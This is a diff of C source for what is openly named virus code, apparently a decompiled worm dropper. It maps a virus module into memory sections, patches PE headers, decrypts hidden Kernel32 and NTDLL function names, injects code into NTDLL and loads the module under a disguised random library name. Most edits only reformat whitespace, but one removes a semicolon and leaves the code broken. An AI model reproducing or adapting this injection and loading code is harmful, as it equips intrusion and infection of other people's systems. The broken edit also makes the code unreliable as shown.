@@ -33,23 +33,23 @@ INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVO
 
 	pBaseAddr1      = 0;
 	pBaseAddr2      = 0;
-	
+
 	iSectionPointer = 0;
 	iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;
-	
+
 	iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pBaseAddr1, &pBaseAddr2);
 	if(iOpenMapViewFailed) return iOpenMapViewFailed;
-	
+
 	sVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pBaseAddr1;
 	pBaseAddr1               = (PVOID)((DWORD)pBaseAddr1 + sizeof(VIRUS_MODULE_BLOCKS_HEADER));
 	iSectionPointer          = sizeof(VIRUS_MODULE_BLOCKS_HEADER);
-	
+
 	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);
 	pVirusImageBase = pBaseAddr1;
-	
+
 	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);
 	pImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;
-	
+
 	if((UINT32)pVirusModuleSize >= 0x1000 &&
 	   pImageDOS->e_magic == MZ_HEADER &&
 	   pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) < (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section ".text"
@@ -58,14 +58,14 @@ INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVO
 		if(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)
 			pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size = 64; // Change Delay Import Directory Size
 	}
-	
+
 	__memcpy(&sVirusModuleBlocksHeader->InformationBlock, sInfoBlock, sizeof(GENERAL_INFO_BLOCK));
-	
+
 	sVirusModuleBlocksHeader->LibraryExecuteEntryNumber = iExecEntryNumber;
 	sVirusModuleBlocksHeader->VirusModulePointer        = 0;
-	
+
 	*pOutSection = pBaseAddr2;
-	
+
 	g_hardAddrs.UnmapViewOfFile(sVirusModuleBlocksHeader); // Unmap pBaseAddr1 -> same copy present in pBaseAddr2
 	g_hardAddrs.ZwClose(hMapHandle);
 
@@ -82,31 +82,32 @@ INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader, PVIRUS_MO
 	GENERAL_INFO_BLOCK sInfoBlockCopy; // [sp+10h] [bp-80h]@1
 
 	__memcpy(&sInfoBlockCopy, sInfoBlock, sizeof(GENERAL_INFO_BLOCK)); // Copy the information
-	
+
 	sInfoBlockCopy.OriginalAddress ^= XADDR_KEY; // Get the original address of the variable sInfoBlock
 	sInfoBlockCopy.UnknownZero0     = 0;
-	
+
 	// Point to the first block of assembly in the section
 	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
-	
+
 	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress, sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);
-	if(iResult) return iResult;
-	
-	if(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs)) return -4;
-	
+	if(iResult) return iResult
+
+	if(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs))
+		return -4;
+
 	/* Load library from the memory */
 	pVirusModule = pHardAddrs->LoadLibraryW(sInfoBlockCopy.RandomLibraryName);
 	if(!pVirusModule) return -9;
-	
+
 	sVirusModuleBlocksHeader->VirusModulePointer = pVirusModule;
 	hMappedAddress = sInfoBlockCopy.MappedAddress;
-	
+
 	if(sInfoBlockCopy.MappedAddress)
 	{
 		sInfoBlockCopy.MappedAddress = 0;
 		pHardAddrs->ZwClose(hMappedAddress);
 	}
-	
+
 	return 0;
 }
 
@@ -151,43 +152,45 @@ INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *pCodeBlo
 
 	pBaseAddr1 = 0;
 	pBaseAddr2 = 0;
-	
+
 	iCodeBlockSize = GetCodeBlockSize(); // [0xB3A] (2874)
 	iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0) + _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0) + iCodeBlockSize;
-	
+
 	iSectionPointer = 0;
-	
+
 	iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &pSectionHandle, &pBaseAddr1, &pBaseAddr2);
+	// Because hHandle = GetCurrentProcess(), pBaseAddr1 == pBaseAddr2
+
 	if(!iOpenMapViewFailed) return iOpenMapViewFailed;
-	
+
 	sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pBaseAddr1;
 	pBaseAddr1           = (PVOID)((DWORD)pBaseAddr1 + sizeof(ASM_CODE_BLOCKS_HEADER));
 	iSectionPointer      = sizeof(ASM_CODE_BLOCKS_HEADER);
-	
+
 	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0));
 	iASMBlock1Pointer = iSectionPointer;
-	
+
 	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0));
 	pCodeBlock = (PVOID)GetCodeBlock();
-	
+
 	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);
-	
+
 	v9 = (DWORD *)((DWORD)sASMCodeBlocksHeader + iASMBlock1Pointer + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
 	*v9 = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);
-	
+
 	// Put function address into the memory map
 	sASMCodeBlocksHeader->ExecuteLibrary = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeExecuteLibraryPointer();
 	sASMCodeBlocksHeader->AlignAddresses = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeAlignAddressesPointer();
 	sASMCodeBlocksHeader->VirusModuleSection = (DWORD)pVirusModuleSection;
-	
+
 	// Put the values in the pointers
 	*pCodeBlockPointer          = (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;
 	*pAssemblyCodeBlocksSection = pBaseAddr2;
-	
+
 	// Close and unmap the first section
 	g_hardAddrs.UnmapViewOfFile(sASMCodeBlocksHeader);
 	g_hardAddrs.ZwClose(pSectionHandle);
-	
+
 	return 0;
 }
 
@@ -199,26 +202,27 @@ INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSi
 
 	// Get a random module name with the format "KERNEL32.DLL.ASLR.XXXXXXXX"
 	if(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0) return 0;
-	
+
 	// Decrypt the Kernel32's and NTDLL's function names
 	if(bSetup && DecodeEncryptedModuleNames() == FALSE) return -12;
-	
+
 	iResult = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
 	if(iResult) return iResult;
-	
+
 	if(bSetup)
 	{
 		iResult = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR, &s_codeBlockPTR, &s_ASMCodeBlocksPTR);
 		if(iResult) return iResult;
-		
+
 		bSetup = FALSE;
 	}
-	
+
 	// Unknown
 	iResult = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR, (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR, &sInfoBlock);
-	if(!iResult) *hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;
-	
+	if(!iResult)
+		*hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;
+
 	g_hardAddrs.UnmapViewOfFile(s_virusBlocksPTR);
-	
+
 	return iResult;
 }
